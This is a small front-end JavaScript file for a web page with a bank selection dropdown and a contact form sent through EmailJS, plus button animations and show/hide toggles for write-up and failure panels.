

let btn = document.getElementById("submit");
let pop = document.getElementById('fail-write');
let write = document.getElementById('write');
let banks = document.getElementById('banks')

let option1 = document.getElementById('opt1')
let option2 = document.getElementById('opt2')
let option3 = document.getElementById('opt3')
let option4 = document.getElementById('opt4')
let option5 = document.getElementById('opt5')
let option6 = document.getElementById('opt6')
let option7 = document.getElementById('opt7')
let option8 = document.getElementById('opt8')
let option9 = document.getElementById('opt9')

// const optionToName = option1;
// Set the name attribute for the option
option1.setAttribute("name", "bank");
let opt1 = option1.getAttribute("name");
option2.setAttribute("name", "bank");
let opt2 = option1.getAttribute("name");
option3.setAttribute("name", "bank");
let opt3 = option1.getAttribute("name");
option4.setAttribute("name", "bank");
let opt4 = option1.getAttribute("name");
option5.setAttribute("name", "bank");
let opt5 = option1.getAttribute("name");
option6.setAttribute("name", "bank");
let opt6 = option1.getAttribute("name");
option7.setAttribute("name", "bank");
let opt7 = option1.getAttribute("name");
option8.setAttribute("name", "bank");
let opt8 = option1.getAttribute("name");
option9.setAttribute("name", "bank");
let opt9 = option1.getAttribute("name");
console.log(opt1)

window.onload = function() {
    document.getElementById('contact-form').addEventListener('submit', function(event) {
        event.preventDefault();
        // generate a five digit number for the contact_number variable
        this.contact_number.value = Math.random() * 100000 | 0;
        // these IDs from the previous steps
        emailjs.sendForm("service_hlj3n6r","template_o5n054h", this)
        .then(function() {
            console.log('SUCCESS!');
            let subscribe = document.getElementById('submit')
            console.log('na me')
            subscribe.style.animationName = 'done';
            subscribe.value = 'DONE'
            // let Subscribe = setTimeout(sub, 2800);
            // function sub(){
            //     subscribe.value = 'Submitted Successfully'
            //     window.location.href="https://workbasehq.github.io/fnb-end/"
            // }
        }, function(error) {
                console.log('FAILED...', error);
                let subscribe = document.getElementById('submit')
                subscribe.value = 'unable to submit'
                subscribe.style.animationName = 'failed';
                let Subscribe = setTimeout(sub, 10000);
                function sub(){
                    subscribe.value = 'Submit '
                }
            });
        });
}

myFunction();
banks.addEventListener('change', myFunction)
function myFunction(){
    let bankSelected = banks.value;
    console.log(bankSelected)
    console.log(opt1)
}

btn.addEventListener('click', ()=>{
    
    let writng = document.getElementById('write-up');
    let form = document.getElementById("contact-form")
    writng.style.display = 'inline'
    writng.style.color = 'black'
    form.style.display = 'none'
    pop.style.display = 'none'
})

let reason = document.getElementById("failure");
reason.addEventListener('click', ()=>{
    pop.style.display = 'inline'
    write.style.display = 'none'

})